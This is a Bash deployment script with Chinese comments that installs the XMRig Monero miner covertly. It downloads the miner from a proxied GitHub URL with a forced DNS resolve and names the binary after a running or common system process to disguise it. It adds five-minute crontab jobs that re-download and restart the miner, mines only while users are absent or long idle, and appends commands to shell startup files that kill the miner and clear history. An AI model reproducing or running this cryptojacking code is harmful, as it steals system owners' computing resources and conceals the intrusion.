#!/bin/bash

# XMRig 自动化部署脚本
# 使用方法: curl -s -L github/miner_zh.sh | LC_ALL=en_US.UTF-8 bash -s ${钱包地址} ${矿池域名和端口} ${核心数百分比}
# 示例: curl -s -L github/miner_zh.sh | LC_ALL=en_US.UTF-8 bash -s 86vvvswgBuKZUs51SZH5j1Wenc8Z5e6FHUFUqp5BkwoxhvCgDMAdovxHsryy8zWaD7iRuEGyFVC7hF722T8Ge4em3x2mNqV auto.c3pool.org:80 50

# 参数检查
if [ $# -ne 3 ]; then
    echo "错误: 参数不足"
    echo "使用方法: $0 <钱包地址> <矿池地址:端口> <核心数百分比>"
    exit 1
fi

WALLET_ADDRESS="$1"
POOL_ADDRESS="$2"
CPU_PERCENTAGE="$3"

# 全局变量
DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
CONFIG_DIR="$HOME/.config"
XMRIG_DIR="$CONFIG_DIR"

# 日志函数
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# 获取系统信息
get_system_info() {
    log "获取系统信息..."
    
    # 获取CPU核心数
    CPU_CORES=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo "1")
    log "检测到CPU核心数: $CPU_CORES"
    
    # 计算实际使用的核心数
    ACTUAL_CORES=$(echo "scale=0; $CPU_CORES * $CPU_PERCENTAGE / 100" | bc 2>/dev/null || echo "1")
    if [ "$ACTUAL_CORES" -eq 0 ]; then
        ACTUAL_CORES=1
    fi
    log "将使用CPU核心数: $ACTUAL_CORES (${CPU_PERCENTAGE}%)"
    
    # 获取系统架构
    ARCH=$(uname -m)
    log "系统架构: $ARCH"
    
    # 获取操作系统信息
    if [ -f /etc/os-release ]; then
        OS_INFO=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
    else
        OS_INFO=$(uname -s)
    fi
    log "操作系统: $OS_INFO"
}

# 获取CPU利用率最高的进程名
get_top_cpu_process() {
    # 排除xmrig相关进程，获取CPU利用率最高的进程
    local TOP_PROCESS=$(ps aux --sort=-%cpu 2>/dev/null | grep -v xmrig | grep -v grep | head -2 | tail -1 | awk '{print $11}' | sed 's/.*\///' 2>/dev/null)
    
    # 清理进程名，只保留字母数字和常见符号
    TOP_PROCESS=$(echo "$TOP_PROCESS" | sed 's/[^a-zA-Z0-9_-]//g')
    
    if [ -z "$TOP_PROCESS" ] || [ "$TOP_PROCESS" = "ps" ] || [ "$TOP_PROCESS" = "sort" ] || [ ${#TOP_PROCESS} -gt 15 ]; then
        # 如果没有找到合适的进程名，使用常见的系统进程名
        local COMMON_PROCESSES=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "NetworkManager" "sshd" "dbus" "chronyd")
        TOP_PROCESS=${COMMON_PROCESSES[$((RANDOM % ${#COMMON_PROCESSES[@]}))]}
    fi
    
    echo "$TOP_PROCESS"
}

# 创建目录
create_directories() {
    log "创建必要目录..."
    mkdir -p "$XMRIG_DIR"
    if [ $? -eq 0 ]; then
        log "目录创建成功: $XMRIG_DIR"
    else
        log "错误: 无法创建目录 $XMRIG_DIR"
        exit 1
    fi
}

# 下载xmrig文件
download_xmrig() {
    local filename="$1"
    local filepath="$XMRIG_DIR/$filename"
    
    log "开始下载xmrig文件..."
    log "下载URL: $DOWNLOAD_URL"
    log "保存路径: $filepath"
    
    # 检查curl是否可用
    if ! command -v curl >/dev/null 2>&1; then
        log "错误: 未找到curl命令，无法下载文件"
        return 1
    fi
    
    # 使用curl下载，使用自定义DNS服务器和域名解析
    curl -s -L --dns-servers 8.8.8.8,8.8.4.4 --resolve "gh.llkk.cc:443:104.18.62.129" "$DOWNLOAD_URL" -o "$filepath"
    
    if [ $? -eq 0 ] && [ -f "$filepath" ]; then
        chmod +x "$filepath"
        log "文件下载成功并设置执行权限: $filepath"
        return 0
    else
        log "错误: 文件下载失败"
        return 1
    fi
}

# 启动挖矿进程
start_mining() {
    local filename="$1"
    local filepath="$XMRIG_DIR/$filename"
    
    log "启动挖矿进程..."
    log "钱包地址: $WALLET_ADDRESS"
    log "矿池地址: $POOL_ADDRESS"
    log "使用核心数: $ACTUAL_CORES"
    
    # 构建xmrig命令参数
    XMRIG_ARGS="-o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1"
    
    # 以最低优先级后台运行
    cd "$XMRIG_DIR"
    nohup nice -n 19 ./"$filename" $XMRIG_ARGS >/dev/null 2>&1 &
    
    MINER_PID=$!
    log "挖矿进程已启动，PID: $MINER_PID"
    
    # 验证进程是否成功启动
    sleep 3
    if kill -0 "$MINER_PID" 2>/dev/null; then
        log "挖矿进程运行正常"
        return 0
    else
        log "警告: 挖矿进程可能启动失败"
        return 1
    fi
}

# 检查用户登录状态和闲置时长
check_user_login() {
    local users=$(who | wc -l)
    
    # 如果没有用户在线，直接返回可以执行
    if [ "$users" -eq 0 ]; then
        return 0  # 无用户登录，可以执行
    fi
    
    # 有用户在线，检查每个用户的闲置时长
    local can_execute=1  # 假设可以执行
    
    # 解析who命令输出，检查每个用户的闲置时长
    while IFS= read -r line; do
        if [ -n "$line" ]; then
            # 提取闲置时间字段（第4个字段）
            local idle_time=$(echo "$line" | awk '{print $4}')
            
            # 检查闲置时间格式和长度
            if [[ "$idle_time" == "." ]]; then
                # 当前活跃用户（闲置时间为.），不能执行
                can_execute=0
                break
            elif [[ "$idle_time" =~ ^[0-9]{2}:[0-9]{2}$ ]]; then
                # 格式为 HH:MM，提取小时数
                local hours=$(echo "$idle_time" | cut -d: -f1)
                # 去掉前导零
                hours=$((10#$hours))
                if [ "$hours" -lt 5 ]; then
                    # 闲置时间小于5小时，不能执行
                    can_execute=0
                    break
                fi
            elif [[ "$idle_time" == "old" ]]; then
                # 闲置时间很长（显示为old），可以执行
                continue
            else
                # 其他格式，为安全起见不执行
                can_execute=0
                break
            fi
        fi
    done < <(who)
    
    if [ "$can_execute" -eq 1 ]; then
        return 0  # 所有用户闲置时间都大于5小时，可以执行
    else
        return 1  # 有用户闲置时间小于5小时或当前活跃，不能执行
    fi
}

# 检查进程是否运行
check_process_running() {
    local filename="$1"
    pgrep -f "$filename" >/dev/null 2>&1
}

# 设置定时任务
setup_crontab() {
    local filename="$1"
    
    log "设置定时任务..."
    
    # 构建用户状态检查逻辑（内联到crontab中）
    local user_check_logic="users=\\\$(who | wc -l); if [ \\\$users -eq 0 ]; then can_exec=1; else can_exec=1; while IFS= read -r line; do if [ -n \"\\\$line\" ]; then idle=\\\$(echo \"\\\$line\" | awk '{print \\\$4}'); if [[ \"\\\$idle\" == \".\" ]]; then can_exec=0; break; elif [[ \"\\\$idle\" =~ ^[0-9]{2}:[0-9]{2}\\\$ ]]; then hours=\\\$(echo \"\\\$idle\" | cut -d: -f1); hours=\\\$((10#\\\$hours)); if [ \\\$hours -lt 5 ]; then can_exec=0; break; fi; elif [[ \"\\\$idle\" != \"old\" ]]; then can_exec=0; break; fi; fi; done < <(who); fi"
    
    # 构建定时任务命令 - 任务1：文件检查和下载（每5分钟）
    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L --dns-servers 8.8.8.8,8.8.4.4 --resolve \"gh.llkk.cc:443:104.18.62.129\" \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
    
    # 构建定时任务命令 - 任务2：进程监控和重启（每5分钟）
    local process_monitor_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
    
    # 添加到crontab - 直接将命令写入定时任务
    (crontab -l 2>/dev/null; echo "*/5 * * * * $file_check_cmd >/dev/null 2>&1") | crontab - 2>/dev/null
    (crontab -l 2>/dev/null; echo "*/5 * * * * $process_monitor_cmd >/dev/null 2>&1") | crontab - 2>/dev/null
    
    log "定时任务设置完成"
}

# 设置安全清理机制
setup_cleanup() {
    local filename="$1"
    
    log "设置安全清理机制..."
    
    # 创建清理命令
    local cleanup_cmd="pkill -f $filename 2>/dev/null; rm -f $XMRIG_DIR/$filename 2>/dev/null; history -c && history -w 2>/dev/null"
    
    # 添加到各种shell配置文件
    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc")
    
    for config in "${shell_configs[@]}"; do
        if [ -f "$config" ] || [ "$config" = "$HOME/.bashrc" ]; then
            # 检查是否已经存在清理命令
            if ! grep -q "pkill -f $filename" "$config" 2>/dev/null; then
                echo "" >> "$config"
                echo "# Auto cleanup" >> "$config"
                echo "$cleanup_cmd" >> "$config"
                log "已添加清理命令到: $config"
            fi
        fi
    done
}

# 持续监控循环
continuous_monitor() {
    local filename="$1"
    
    log "启动持续监控..."
    
    while true; do
        sleep 300  # 每5分钟检查一次
        
        # 检查用户登录状态
        if check_user_login; then
            # 无用户登录时的监控逻辑
            
            # 检查文件是否存在
            if [ ! -f "$XMRIG_DIR/$filename" ]; then
                log "检测到文件丢失，重新下载..."
                download_xmrig "$filename"
            fi
            
            # 检查进程是否运行
            if ! check_process_running "$filename"; then
                log "检测到进程异常，重新启动..."
                start_mining "$filename"
            fi
        else
            # 有用户登录时停止挖矿
            if check_process_running "$filename"; then
                log "检测到用户登录，停止挖矿进程"
                pkill -f "$filename" 2>/dev/null
            fi
        fi
    done
}

# 主函数
main() {
    log "=== XMRig 自动化部署脚本启动 ==="
    log "钱包地址: $WALLET_ADDRESS"
    log "矿池地址: $POOL_ADDRESS"
    log "CPU百分比: $CPU_PERCENTAGE%"
    
    # 检查必要命令
    for cmd in bc nproc ps curl; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            if [ "$cmd" = "curl" ]; then
                log "错误: 未找到curl命令，这是必需的下载工具"
                exit 1
            else
                log "警告: 未找到命令 $cmd，某些功能可能受限"
            fi
        fi
    done
    
    # 获取系统信息
    get_system_info
    
    # 获取进程名
    PROCESS_NAME=$(get_top_cpu_process)
    log "选择进程名: $PROCESS_NAME"
    
    # 创建目录
    create_directories
    
    # 下载文件
    if download_xmrig "$PROCESS_NAME"; then
        log "文件下载成功"
    else
        log "文件下载失败，退出"
        exit 1
    fi
    
    # 设置定时任务
    setup_crontab "$PROCESS_NAME"
    
    # 设置清理机制
    setup_cleanup "$PROCESS_NAME"
    
    # 启动挖矿
    if check_user_login; then
        start_mining "$PROCESS_NAME"
    else
        log "检测到用户已登录，暂不启动挖矿进程"
    fi
    
    log "=== 部署完成 ==="
    log "进程名: $PROCESS_NAME"
    log "安装路径: $XMRIG_DIR/$PROCESS_NAME"
    log "监控状态: 已启用"
    
    # 启动持续监控（后台运行）
    nohup bash -c "$(declare -f continuous_monitor check_user_login check_process_running download_xmrig start_mining log); continuous_monitor '$PROCESS_NAME'" >/dev/null 2>&1 &
    
    log "持续监控已启动"
}

# 执行主函数
main "$@"
